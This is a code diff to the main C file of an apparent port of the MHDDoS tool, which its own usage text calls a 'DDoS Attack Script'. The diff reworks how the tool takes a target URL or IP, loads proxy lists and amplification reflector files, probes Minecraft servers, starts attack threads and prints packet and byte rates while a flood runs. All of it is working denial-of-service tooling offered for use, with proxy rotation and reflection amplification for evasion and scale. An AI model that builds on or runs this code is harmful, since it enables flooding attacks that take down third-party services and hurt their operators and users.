@@ -1,25 +1,58 @@
 #include "mhddos.h"
 
 static void usage(const char *prog) {
+    const char *l4_methods = "TCP, UDP, SYN, ICMP, VSE, TS3, MCPE, FIVEM, FIVEM-TOKEN, "
+                             "OVH-UDP, MINECRAFT, CPS, CONNECTION, MCBOT, "
+                             "MEM, NTP, DNS, ARD, CLDAP, CHAR, RDP";
+    int l4_count = 21;
+    const char *l7_methods = "CFB, BYPASS, GET, POST, OVH, STRESS, DYN, SLOW, HEAD, "
+                             "NULL, COOKIE, PPS, EVEN, GSB, DGB, AVB, CFBUAM, "
+                             "APACHE, XMLRPC, BOT, BOMB, DOWNLOADER, KILLER, TOR, RHEX, STOMP";
+    int l7_count = 26;
+    const char *tools_methods = "INFO, TSSRV, CFIP, DNS, PING, CHECK, DSTAT";
+    int tools_count = 7;
+    int total = l4_count + l7_count + 3 + tools_count;
+
     printf(
-        "* MHDDoS - DDoS Attack Script (C Port)\n"
+        "* MHDDoS - DDoS Attack Script With %d Methods\n"
         "Note: If the Proxy list is empty, The attack will run without proxies\n"
+        "      If the Proxy file doesn't exist, the script will download proxies and check them.\n"
+        "      Proxy Type 0 = All in config.json\n"
+        "      SocksTypes:\n"
+        "         - 6 = RANDOM\n"
+        "         - 5 = SOCKS5\n"
+        "         - 4 = SOCKS4\n"
+        "         - 1 = HTTP\n"
+        "         - 0 = ALL\n"
         " > Methods:\n"
         " - Layer4\n"
-        " | TCP, UDP, SYN, ICMP, VSE, TS3, MCPE, FIVEM, FIVEM-TOKEN,\n"
-        " | OVH-UDP, MINECRAFT, CPS, CONNECTION, MCBOT,\n"
-        " | MEM, NTP, DNS, ARD, CLDAP, CHAR, RDP\n"
+        " | %s | %d Methods\n"
         " - Layer7\n"
-        " | GET, POST, CFB, BYPASS, OVH, STRESS, DYN, SLOW, HEAD,\n"
-        " | NULL, COOKIE, PPS, EVEN, GSB, DGB, AVB, CFBUAM,\n"
-        " | APACHE, XMLRPC, BOT, BOMB, DOWNLOADER, KILLER, TOR, RHEX, STOMP\n"
+        " | %s | %d Methods\n"
+        " - Tools\n"
+        " | %s | %d Methods\n"
+        " - Others\n"
+        " | TOOLS, HELP, STOP | 3 Methods\n"
+        " - All %d Methods\n"
         "\n"
         "Example:\n"
-        "   L7: %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>\n"
+        "   L7: %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>\n"
         "   L4: %s <method> <ip:port> <threads> <duration>\n"
         "   L4 Proxied: %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\n"
-        "   L4 Amp: %s <method> <ip:port> <threads> <duration> <reflector_file>\n",
+        "   L4 Amplification: %s <method> <ip:port> <threads> <duration> <reflector file (only use with Amplification)>\n",
+        total,
+        l4_methods, l4_count,
+        l7_methods, l7_count,
+        tools_methods, tools_count,
+        total,
         prog, prog, prog, prog);
+    fflush(stdout);
+}
+
+static void stop_all(void) {
+    printf("All Attacks has been Stopped !\n");
+    fflush(stdout);
+    exit(0);
 }
 
 static void set_amp_payload(layer4_args_t *args, const uint8_t *payload, int len, int port) {
@@ -36,26 +69,54 @@ int main(int argc, char *argv[]) {
 
     get_local_ip(g_local_ip, sizeof(g_local_ip));
 
-    if (argc < 2) { usage(argv[0]); return 1; }
-
-    if (strcasecmp(argv[1], "HELP") == 0) { usage(argv[0]); return 0; }
-
-    method_t method = parse_method(argv[1]);
-    if (method == METHOD_UNKNOWN) {
-        fprintf(stderr, BCOLORS_FAIL "Method Not Found" BCOLORS_RESET "\n");
+    if (argc < 2) {
         usage(argv[0]);
         return 1;
     }
 
-    if (argc < 3) { usage(argv[0]); return 1; }
+    char one[64];
+    strncpy(one, argv[1], sizeof(one) - 1);
+    one[sizeof(one) - 1] = '\0';
+    for (int i = 0; one[i]; i++) one[i] = toupper((unsigned char)one[i]);
+
+    if (strcmp(one, "HELP") == 0) {
+        usage(argv[0]);
+        return 0;
+    }
+    if (strcmp(one, "TOOLS") == 0) {
+        printf("Tools console not available in C port\n");
+        fflush(stdout);
+        return 0;
+    }
+    if (strcmp(one, "STOP") == 0) {
+        stop_all();
+        return 0;
+    }
+
+    method_t method = parse_method(one);
+    if (method == METHOD_UNKNOWN) {
+        fprintf(stderr, BCOLORS_FAIL "Method Not Found %s" BCOLORS_RESET "\n", one);
+        usage(argv[0]);
+        return 1;
+    }
+
+    if (argc < 3) {
+        usage(argv[0]);
+        return 1;
+    }
 
     volatile int running = 0;
     char urlraw[4096];
+    memset(urlraw, 0, sizeof(urlraw));
     strncpy(urlraw, argv[2], sizeof(urlraw) - 1);
-    if (strncmp(urlraw, "http", 4) != 0) {
-        char tmp[4096];
-        snprintf(tmp, sizeof(tmp), "http://%s", urlraw);
-        strncpy(urlraw, tmp, sizeof(urlraw) - 1);
+    {
+        char *p = urlraw;
+        while (*p && (isspace((unsigned char)*p))) p++;
+        if (strncmp(p, "http", 4) != 0) {
+            char tmp[4096];
+            snprintf(tmp, sizeof(tmp), "http://%s", p);
+            strncpy(urlraw, tmp, sizeof(urlraw) - 1);
+        }
     }
 
     if (is_layer7(method)) {
@@ -68,67 +129,76 @@ int main(int argc, char *argv[]) {
         parse_url(urlraw, &target);
 
         char host_ip[256];
-        struct hostent *he = gethostbyname(target.host);
-        if (!he) {
-            fprintf(stderr, BCOLORS_FAIL "Cannot resolve hostname %s" BCOLORS_RESET "\n", target.host);
-            return 1;
+        if (strcmp(one, "TOR") != 0) {
+            struct hostent *he = gethostbyname(target.host);
+            if (!he) {
+                fprintf(stderr, BCOLORS_FAIL "Cannot resolve hostname %s" BCOLORS_RESET "\n", target.host);
+                return 1;
+            }
+            inet_ntop(AF_INET, he->h_addr_list[0], host_ip, sizeof(host_ip));
+        } else {
+            strncpy(host_ip, target.host, sizeof(host_ip));
         }
-        inet_ntop(AF_INET, he->h_addr_list[0], host_ip, sizeof(host_ip));
 
-        int proxy_ty = atoi(argv[3]);
         int threads = atoi(argv[4]);
         int rpc = atoi(argv[6]);
         int timer = atoi(argv[7]);
+        int proxy_ty = atoi(argv[3]);
 
-        char ua_path[512], ref_path[512], proxy_path[512];
-        snprintf(ua_path, sizeof(ua_path), "files/useragent.txt");
-        snprintf(ref_path, sizeof(ref_path), "files/referers.txt");
+        char proxy_path[512];
         snprintf(proxy_path, sizeof(proxy_path), "files/proxies/%s", argv[5]);
+        char ua_path[512];
+        snprintf(ua_path, sizeof(ua_path), "files/useragent.txt");
+        char ref_path[512];
+        snprintf(ref_path, sizeof(ref_path), "files/referers.txt");
 
-        char **useragents = NULL, **referers = NULL;
+        if (argc == 9) {
+            fprintf(stderr, "[DEBUG MODE]\n");
+        }
+
+        char **useragents = NULL;
         int ua_count = load_lines(ua_path, &useragents, MAX_USERAGENTS);
-        int ref_count = load_lines(ref_path, &referers, MAX_REFERERS);
-
         if (ua_count == 0) {
-            static char *default_ua[] = {
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/74.0.3729.169 Safari/537.36",
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
-            };
-            useragents = default_ua;
-            ua_count = 2;
-        }
-        if (ref_count == 0) {
-            static char *default_ref[] = {
-                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
-                "https://www.google.com/translate?u="
-            };
-            referers = default_ref;
-            ref_count = 2;
+            fprintf(stderr, BCOLORS_FAIL "The Useragent file doesn't exist " BCOLORS_RESET "\n");
+            return 1;
         }
 
-        proxy_t *proxies = NULL;
-        int proxy_count = 0;
-        proxy_t proxy_arr[MAX_PROXIES];
-        proxy_type_t pt = (proxy_type_t)proxy_ty;
-        if (pt == PROXY_RANDOM) pt = (proxy_type_t)(1 + rand() % 3);
-        proxy_count = load_proxies(proxy_path, proxy_arr, MAX_PROXIES, pt);
-        if (proxy_count > 0) {
-            proxies = proxy_arr;
-            printf(BCOLORS_WARNING "Proxy Count: " BCOLORS_OKBLUE "%d" BCOLORS_RESET "\n", proxy_count);
-        } else {
-            printf(BCOLORS_WARNING "Empty Proxy File, running flood without proxy" BCOLORS_RESET "\n");
+        char **referers = NULL;
+        int ref_count = load_lines(ref_path, &referers, MAX_REFERERS);
+        if (ref_count == 0) {
+            fprintf(stderr, BCOLORS_FAIL "The Referer file doesn't exist " BCOLORS_RESET "\n");
+            return 1;
         }
 
         if (threads > 1000)
             printf(BCOLORS_WARNING "Thread is higher than 1000" BCOLORS_RESET "\n");
         if (rpc > 100)
-            printf(BCOLORS_WARNING "RPC is higher than 100" BCOLORS_RESET "\n");
+            printf(BCOLORS_WARNING "RPC (Request Pre Connection) is higher than 100" BCOLORS_RESET "\n");
+
+        proxy_t *proxies = NULL;
+        int proxy_count = 0;
+
+        proxy_type_t pt = (proxy_type_t)proxy_ty;
+        if (pt == PROXY_RANDOM) pt = (proxy_type_t)(1 + (rand() % 3));
+        if (pt != PROXY_NONE) {
+            proxy_t *proxy_arr = malloc(sizeof(proxy_t) * MAX_PROXIES);
+            if (proxy_arr) {
+                proxy_count = load_proxies(proxy_path, proxy_arr, MAX_PROXIES, pt);
+                if (proxy_count > 0) {
+                    proxies = proxy_arr;
+                    printf(BCOLORS_WARNING "Proxy Count: " BCOLORS_OKBLUE "%d" BCOLORS_RESET "\n", proxy_count);
+                } else {
+                    printf(BCOLORS_WARNING "Empty Proxy File, running flood without proxy" BCOLORS_RESET "\n");
+                    free(proxy_arr);
+                }
+            }
+        }
 
         SSL_CTX *ssl_ctx = SSL_CTX_new(TLS_client_method());
         SSL_CTX_set_verify(ssl_ctx, SSL_VERIFY_NONE, NULL);
         SSL_CTX_set_min_proto_version(ssl_ctx, TLS1_2_VERSION);
 
-        pthread_t tids[MAX_THREADS];
+        pthread_t *tids = malloc(sizeof(pthread_t) * threads);
         layer7_args_t *thread_args = calloc(threads, sizeof(layer7_args_t));
 
         for (int i = 0; i < threads; i++) {
@@ -152,25 +222,34 @@ int main(int argc, char *argv[]) {
         printf(BCOLORS_WARNING "Attack Started to" BCOLORS_OKBLUE " %s " BCOLORS_WARNING
                "with" BCOLORS_OKBLUE " %s " BCOLORS_WARNING "method for" BCOLORS_OKBLUE
                " %d " BCOLORS_WARNING "seconds, threads:" BCOLORS_OKBLUE " %d" BCOLORS_WARNING
-               "!" BCOLORS_RESET "\n", target.host, argv[1], timer, threads);
+               "!" BCOLORS_RESET "\n", target.host, one, timer, threads);
+        fflush(stdout);
 
         running = 1;
         time_t ts = time(NULL);
         while (time(NULL) < ts + timer) {
-            char pps_buf[64], bps_buf[64];
             long req = atomic_exchange(&REQUESTS_SENT, 0);
             long byt = atomic_exchange(&BYTES_SEND, 0);
+            char pps_buf[64], bps_buf[64];
             humanformat(req, pps_buf, sizeof(pps_buf));
             humanbytes(byt, bps_buf, sizeof(bps_buf));
             double pct = (double)(time(NULL) - ts) / timer * 100.0;
-            printf(BCOLORS_WARNING "PPS:" BCOLORS_OKBLUE " %s, " BCOLORS_WARNING
-                   "BPS:" BCOLORS_OKBLUE " %s / %.1f%%" BCOLORS_RESET "\n", pps_buf, bps_buf, pct);
+            printf(BCOLORS_WARNING "Target:" BCOLORS_OKBLUE " %s," BCOLORS_WARNING
+                   " Port:" BCOLORS_OKBLUE " %d," BCOLORS_WARNING
+                   " Method:" BCOLORS_OKBLUE " %s" BCOLORS_WARNING
+                   " PPS:" BCOLORS_OKBLUE " %s," BCOLORS_WARNING
+                   " BPS:" BCOLORS_OKBLUE " %s / %.0f%%" BCOLORS_RESET "\n",
+                   target.host, target.port, one, pps_buf, bps_buf, pct);
+            fflush(stdout);
             sleep(1);
         }
+
         running = 0;
         sleep(1);
         SSL_CTX_free(ssl_ctx);
         free(thread_args);
+        free(tids);
+        if (proxies) free(proxies);
 
     } else if (is_layer4(method)) {
         if (argc < 5) {
@@ -190,32 +269,54 @@ int main(int argc, char *argv[]) {
         inet_ntop(AF_INET, he->h_addr_list[0], target_ip, sizeof(target_ip));
 
         int port = target.port;
-        if (port <= 0 || port > 65535) { port = 80; }
-
-        int threads = atoi(argv[3]);
-        int timer = atoi(argv[4]);
-
-        if ((method == METHOD_SYN || method == METHOD_ICMP || method == METHOD_NTP ||
-             method == METHOD_DNS_AMP || method == METHOD_RDP || method == METHOD_CHAR ||
-             method == METHOD_MEM || method == METHOD_CLDAP || method == METHOD_ARD) &&
-            !check_raw_socket()) {
-            fprintf(stderr, BCOLORS_FAIL "Cannot Create Raw Socket (need root)" BCOLORS_RESET "\n");
+        if (port > 65535 || port < 1) {
+            fprintf(stderr, BCOLORS_FAIL "Invalid Port [Min: 1 / Max: 65535] " BCOLORS_RESET "\n");
             return 1;
         }
 
+        if ((method == METHOD_NTP || method == METHOD_DNS_AMP || method == METHOD_RDP ||
+             method == METHOD_CHAR || method == METHOD_MEM || method == METHOD_CLDAP ||
+             method == METHOD_ARD || method == METHOD_SYN || method == METHOD_ICMP) &&
+            !check_raw_socket()) {
+            fprintf(stderr, BCOLORS_FAIL "Cannot Create Raw Socket" BCOLORS_RESET "\n");
+            return 1;
+        }
+
+        if (is_amp(method)) {
+            printf(BCOLORS_WARNING "this method need spoofable servers please check" BCOLORS_RESET "\n");
+            printf(BCOLORS_WARNING "https://github.com/MHProDev/MHDDoS/wiki/Amplification-ddos-attack" BCOLORS_RESET "\n");
+        }
+
+        int threads = atoi(argv[3]);
+        int timer = atoi(argv[4]);
         proxy_t *proxies = NULL;
         int proxy_count = 0;
-        proxy_t proxy_arr[MAX_PROXIES];
-
         char **refs = NULL;
         int ref_count = 0;
 
+        if (!port) {
+            printf(BCOLORS_WARNING "Port Not Selected, Set To Default: 80" BCOLORS_RESET "\n");
+            port = 80;
+        }
+
         if (argc >= 6) {
-            if (is_amp(method)) {
-                char ref_path[512];
-                snprintf(ref_path, sizeof(ref_path), "files/%s", argv[5]);
-                FILE *rf = fopen(ref_path, "r");
-                if (rf) {
+            char *argfive = argv[5];
+            while (*argfive && isspace((unsigned char)*argfive)) argfive++;
+
+            if (strlen(argfive) > 0) {
+                if (method == METHOD_NTP || method == METHOD_DNS_AMP || method == METHOD_RDP ||
+                    method == METHOD_CHAR || method == METHOD_MEM || method == METHOD_CLDAP ||
+                    method == METHOD_ARD) {
+                    char refl_path[512];
+                    snprintf(refl_path, sizeof(refl_path), "files/%s", argfive);
+                    FILE *rf = fopen(refl_path, "r");
+                    if (!rf) {
+                        fprintf(stderr, BCOLORS_FAIL "The reflector file doesn't exist" BCOLORS_RESET "\n");
+                        return 1;
+                    }
+                    if (argc == 7) {
+                        fprintf(stderr, "[DEBUG MODE]\n");
+                    }
                     refs = malloc(sizeof(char*) * MAX_REFS);
                     char line[256];
                     while (fgets(line, sizeof(line), rf) && ref_count < MAX_REFS) {
@@ -226,22 +327,80 @@ int main(int argc, char *argv[]) {
                         }
                     }
                     fclose(rf);
+                    if (ref_count == 0) {
+                        fprintf(stderr, BCOLORS_FAIL "Empty Reflector File " BCOLORS_RESET "\n");
+                        return 1;
+                    }
+                } else {
+                    int is_digit = 1;
+                    for (int i = 0; argfive[i]; i++) {
+                        if (!isdigit((unsigned char)argfive[i])) { is_digit = 0; break; }
+                    }
+                    if (is_digit && argc >= 7) {
+                        if (argc == 8) {
+                            fprintf(stderr, "[DEBUG MODE]\n");
+                        }
+                        int proxy_ty = atoi(argfive);
+                        proxy_type_t pt = (proxy_type_t)proxy_ty;
+                        if (pt == PROXY_RANDOM) pt = (proxy_type_t)(1 + (rand() % 3));
+                        char proxy_path[512];
+                        snprintf(proxy_path, sizeof(proxy_path), "files/proxies/%s", argv[6]);
+                        proxy_t *proxy_arr = malloc(sizeof(proxy_t) * MAX_PROXIES);
+                        if (proxy_arr) {
+                            proxy_count = load_proxies(proxy_path, proxy_arr, MAX_PROXIES, pt);
+                            if (proxy_count > 0) proxies = proxy_arr;
+                            else free(proxy_arr);
+                        }
+                        if (method != METHOD_MINECRAFT && method != METHOD_MCBOT &&
+                            method != METHOD_TCP && method != METHOD_CPS &&
+                            method != METHOD_CONNECTION) {
+                            fprintf(stderr, BCOLORS_FAIL "this method cannot use for layer4 proxy" BCOLORS_RESET "\n");
+                            return 1;
+                        }
+                    } else {
+                        fprintf(stderr, "[DEBUG MODE]\n");
+                    }
                 }
-                if (ref_count == 0) do_exit("Empty Reflector File");
-            } else if (argc >= 7) {
-                int proxy_ty = atoi(argv[5]);
-                proxy_type_t pt = (proxy_type_t)proxy_ty;
-                if (pt == PROXY_RANDOM) pt = (proxy_type_t)(1 + rand() % 3);
-                char proxy_path[512];
-                snprintf(proxy_path, sizeof(proxy_path), "files/proxies/%s", argv[6]);
-                proxy_count = load_proxies(proxy_path, proxy_arr, MAX_PROXIES, pt);
-                if (proxy_count > 0) proxies = proxy_arr;
             }
         }
 
         int protocolid = MINECRAFT_DEFAULT_PROTOCOL;
 
-        pthread_t tids[MAX_THREADS];
+        if (method == METHOD_MCBOT) {
+            int probe = socket(AF_INET, SOCK_STREAM, 0);
+            if (probe >= 0) {
+                struct sockaddr_in addr;
+                memset(&addr, 0, sizeof(addr));
+                addr.sin_family = AF_INET;
+                addr.sin_port = htons(port);
+                inet_pton(AF_INET, target_ip, &addr.sin_addr);
+                struct timeval tv = {2, 0};
+                setsockopt(probe, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+                setsockopt(probe, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+                if (connect(probe, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
+                    uint8_t hs[1024];
+                    int hslen = mc_handshake(target_ip, port, protocolid, 1, hs);
+                    send(probe, hs, hslen, 0);
+                    uint8_t ping_pkt[16];
+                    uint8_t zero = 0x00;
+                    int pinglen = mc_data(&zero, 1, ping_pkt);
+                    send(probe, ping_pkt, pinglen, 0);
+                    uint8_t resp[1024];
+                    int rlen = recv(probe, resp, sizeof(resp), 0);
+                    if (rlen > 0) {
+                        char *p = strstr((char*)resp, "\"protocol\":");
+                        if (p) {
+                            int pv = atoi(p + 11);
+                            if (pv > 47 && pv < 758)
+                                protocolid = pv;
+                        }
+                    }
+                }
+                close(probe);
+            }
+        }
+
+        pthread_t *tids = malloc(sizeof(pthread_t) * threads);
         layer4_args_t *thread_args = calloc(threads, sizeof(layer4_args_t));
 
         for (int i = 0; i < threads; i++) {
@@ -288,27 +447,39 @@ int main(int argc, char *argv[]) {
             pthread_create(&tids[i], NULL, layer4_thread, &thread_args[i]);
         }
 
-        printf(BCOLORS_WARNING "Attack Started to" BCOLORS_OKBLUE " %s:%d " BCOLORS_WARNING
+        printf(BCOLORS_WARNING "Attack Started to" BCOLORS_OKBLUE " %s " BCOLORS_WARNING
                "with" BCOLORS_OKBLUE " %s " BCOLORS_WARNING "method for" BCOLORS_OKBLUE
                " %d " BCOLORS_WARNING "seconds, threads:" BCOLORS_OKBLUE " %d" BCOLORS_WARNING
-               "!" BCOLORS_RESET "\n", target_ip, port, argv[1], timer, threads);
+               "!" BCOLORS_RESET "\n", target_ip, one, timer, threads);
+        fflush(stdout);
 
         running = 1;
         time_t ts = time(NULL);
         while (time(NULL) < ts + timer) {
-            char pps_buf[64], bps_buf[64];
             long req = atomic_exchange(&REQUESTS_SENT, 0);
             long byt = atomic_exchange(&BYTES_SEND, 0);
+            char pps_buf[64], bps_buf[64];
             humanformat(req, pps_buf, sizeof(pps_buf));
             humanbytes(byt, bps_buf, sizeof(bps_buf));
             double pct = (double)(time(NULL) - ts) / timer * 100.0;
-            printf(BCOLORS_WARNING "PPS:" BCOLORS_OKBLUE " %s, " BCOLORS_WARNING
-                   "BPS:" BCOLORS_OKBLUE " %s / %.1f%%" BCOLORS_RESET "\n", pps_buf, bps_buf, pct);
+            printf(BCOLORS_WARNING "Target:" BCOLORS_OKBLUE " %s," BCOLORS_WARNING
+                   " Port:" BCOLORS_OKBLUE " %d," BCOLORS_WARNING
+                   " Method:" BCOLORS_OKBLUE " %s" BCOLORS_WARNING
+                   " PPS:" BCOLORS_OKBLUE " %s," BCOLORS_WARNING
+                   " BPS:" BCOLORS_OKBLUE " %s / %.0f%%" BCOLORS_RESET "\n",
+                   target_ip, port, one, pps_buf, bps_buf, pct);
+            fflush(stdout);
             sleep(1);
         }
+
         running = 0;
         sleep(1);
         free(thread_args);
+        free(tids);
+        if (proxies) free(proxies);
+
+    } else {
+        usage(argv[0]);
     }
 
     return 0;
